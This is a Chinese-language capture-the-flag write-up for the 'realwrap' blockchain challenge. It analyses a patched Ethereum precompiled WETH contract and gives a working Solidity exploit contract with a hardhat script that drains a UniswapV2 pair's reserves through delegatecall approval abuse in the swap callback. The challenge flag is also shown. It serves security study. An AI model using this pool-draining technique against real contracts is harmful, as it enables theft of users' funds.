---
title: Blockchain - realwrap
description: 2023 | Real World CTF | Blockchain
tags:
    - smart contract
    - precompiled contract
    - evm
---

## 题目

WETH on Ethereum is too cumbersome! I'll show you what is real Wrapped ETH by utilizing precompiled contract, it works like a charm especially when exchanging ETH in a swap pair. And most important, IT IS VERY SECURE!

nc 47.254.91.104 20000

faucet: http://47.254.91.104:8080

RPC(geth v1.10.26 with realwrap patch): http://47.254.91.104:8545

[:material-download: `realwrap.zip`](static/realwrap.zip)

## 解题思路

- 目标是将 `UniswapV2Pair` 的 `reserve0` 和 `reserve1` 清零，即清空合约 `UniswapV2Pair` 持有的 `WETH` 和 `SimpleToken`
- 合约 `UniswapV2Pair` 中的函数 `swap` 在参数 `data` 不为空时，将调用外部合约的函数 `uniswapV2Call`，通过参数 `to` 控制，函数执行内容可自定义
    - 由于 `mint` 中永久锁定了一部分资金，因此合约 `UniswapV2Pair` 的余额始终小于 `totalSupply`，无法通过 `burn` 清空余额
- `WETH`（Wrapped Ether，以太币操作套用 `ERC20` 标准） 与 `SimpleToken` 不同，合约地址是固定的，在合约 `Factory` 中没有初始化的过程，用 `web3.eth.getCode` 也获取不到合约的字节码
- 随后意识到 `WETH` 是预编译合约，并注意到了文件 `geth_v1.10.26_precompiled.diff`
- 预编译合约的调用需要通过内联汇编，不过本题对预编译合约进行了包装（`contracts.go`），因此 `UniswapV2Pair` 中调用 `WETH` 中函数的方式与 `SimpleToken` 相同
- 接下来分析 `contracts_weth.go`，与标准的 `IERC20` 不同，还实现了一个 `transferAndCall` 函数

    ```go
    functions = map[string]RunStatefulPrecompileFunc{
        calculateFunctionSelector("name()"):                                 metadata("name"),
        calculateFunctionSelector("symbol()"):                               metadata("symbol"),
        calculateFunctionSelector("decimals()"):                             metadata("decimals"),
        calculateFunctionSelector("balanceOf(address)"):                     balanceOf,
        calculateFunctionSelector("transfer(address,uint256)"):              transfer,
        calculateFunctionSelector("transferAndCall(address,uint256,bytes)"): transferAndCall,
        calculateFunctionSelector("allowance(address,address)"):             allowance,
        calculateFunctionSelector("approve(address,uint256)"):               approve,
        calculateFunctionSelector("transferFrom(address,address,uint256)"):  transferFrom,
    }
    ```

- `transferAndCall` 能够在转账的同时，以设定的数据（`inputArgs.Data`）调用接收者合约[^evmcall]。若能让 `UniswapV2Pair` 调用 token 的 `approve` 函数就能够清空合约的余额

    ```go
    func transferAndCall(evm *EVM, caller common.Address, input []byte, suppliedGas uint64, readOnly bool) (ret []byte, remainingGas uint64, err error) {
        if readOnly {
            return nil, suppliedGas, ErrWriteProtection
        }
        inputArgs := &TransferAndCallInput{}
        if err = unpackInputIntoInterface(inputArgs, "transferAndCall", input); err != nil {
            return nil, suppliedGas, err
        }

        if ret, remainingGas, err = transferInternal(evm, suppliedGas, caller, inputArgs.To, inputArgs.Amount); err != nil {
            return ret, remainingGas, err
        }

        code := evm.StateDB.GetCode(inputArgs.To)
        if len(code) == 0 {
            return ret, remainingGas, nil
        }

        snapshot := evm.StateDB.Snapshot()
        evm.depth++
        defer func() { evm.depth-- }()

        if ret, remainingGas, err = evm.Call(AccountRef(caller), inputArgs.To, inputArgs.Data, remainingGas, common.Big0); err != nil {
            evm.StateDB.RevertToSnapshot(snapshot)
            if err != ErrExecutionReverted {
                remainingGas = 0
            }
        }

        return ret, remainingGas, err
    }
    ```

- 若在 `uniswapV2Call` 中直接使用 `transferAndCall`，调用者将为攻击者合约，因而可以通过代理调用来转换调用者
- 另外，`contracts_weth.go` 中实现的 `approve` 硬编码了状态修改的目标（`realWrappedEtherAddr`）

    ```go
    func approve(evm *EVM, caller common.Address, input []byte, suppliedGas uint64, readOnly bool) (ret []byte, remainingGas uint64, err error) {
        if evm.interpreter.readOnly {
            return nil, suppliedGas, ErrWriteProtection
        }
        inputArgs := &ApproveInput{}
        if err = unpackInputIntoInterface(inputArgs, "approve", input); err != nil {
            return nil, suppliedGas, err
        }

        return approveInternal(evm, suppliedGas, caller, inputArgs.Spender, inputArgs.Amount)
    }
    func approveInternal(evm *EVM, suppliedGas uint64, owner, spender common.Address, value *big.Int) (ret []byte, remainingGas uint64, err error) {
        if remainingGas, err = deductGas(suppliedGas, params.Keccak256Gas*2); err != nil {
            return nil, 0, err
        }
        loc := calculateAllowancesStorageSlot(owner, spender)

        if remainingGas, err = deductGas(suppliedGas, params.SstoreSetGas); err != nil {
            return nil, 0, err
        }

        evm.StateDB.SetState(realWrappedEtherAddr, loc, common.BigToHash(value))
        return math.PaddedBigBytes(common.Big1, common.HashLength), remainingGas, nil
    }
    ```

### Exploit

??? note "Hack.sol"

    ```js
    pragma solidity ^0.8.17;

    import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

    interface IUniswapV2Pair {
        function token0() external view returns (address);
        function token1() external view returns (address);
        function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
        function sync() external;
    }

    contract Hack {
        address public WETH;
        address public token;
        IUniswapV2Pair public pair;
        constructor(address instance) payable {
            require(msg.value == 1);
            pair = IUniswapV2Pair(instance);
            WETH = pair.token0();
            token = pair.token1();
        }

        function exploit() public {
            pair.swap(0, 1, address(this), bytes("1"));
            IERC20(WETH).transferFrom(address(pair), address(this), IERC20(WETH).balanceOf(address(pair)));
            IERC20(token).transferFrom(address(pair), address(this), IERC20(token).balanceOf(address(pair)));
            pair.sync();
        }

        function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
            bytes memory approveCall = abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                type(uint256).max
            );
            address(WETH).delegatecall(approveCall);
            address(WETH).delegatecall(
                abi.encodeWithSignature(
                    "transferAndCall(address,uint256,bytes)",
                    token,
                    0,
                    approveCall
            ));
            IERC20(WETH).transfer(address(pair), 1);
        }
    }
    ```

??? note "exploit.js"

    ```js
    const { ethers } = require("hardhat");

    async function main() {
        const Factory = await ethers.getContractFactory("Factory");
        const factory = await Factory.attach(process.env.FACTORY_ADDRESS);

        console.log(`isSolved: ${await factory.isSolved()}`);

        const Hack = await ethers.getContractFactory("Hack");
        const hack = await Hack.deploy(await factory.uniswapV2Pair(), { value: 1 });
        await hack.deployed();

        let tx = await hack.exploit();
        await tx.wait();

        console.log(`isSolved: ${await factory.isSolved()}`);
    }

    main().catch((error) => {
        console.error(error);
        process.exitCode = 1;
    })
    ```

```bash
$ npm i
$ npx hardhat compile
$ export FACTORY_ADDRESS="<factory_address>"
# 编辑 hardhat.config.js，配置 url 和账户私钥
$ npx hardhat run scripts/exploit.js --network chall
```

### Flag

> rwctf{pREcOmpilEd_m4st3r_5TolE_mY_M0ney}

## 参考资料

- [Precompiled Contracts and Confidential Assets | by Qtum | Qtum](https://blog.qtum.org/precompiled-contracts-and-confidential-assets-55f2b47b231d)
- [7. Deploying to a live network | Ethereum development environment for professionals by Nomic Foundation](https://hardhat.org/tutorial/deploying-to-a-live-network)

[^evmcall]: [ethereum/go-ethereum](https://github.com/ethereum/go-ethereum/blob/master/core/vm/evm.go#L167)